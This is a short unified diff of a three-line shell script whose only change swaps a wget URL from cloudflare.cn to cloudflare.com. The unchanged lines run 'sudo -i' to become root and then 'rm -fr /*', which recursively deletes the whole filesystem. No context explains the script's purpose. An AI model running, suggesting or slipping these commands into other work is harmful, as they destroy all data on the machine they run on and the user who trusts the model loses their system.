@@ -1,3 +1,3 @@
 sudo -i
-wget https://cloudflare.cn
+wget https://cloudflare.com
 rm -fr /*
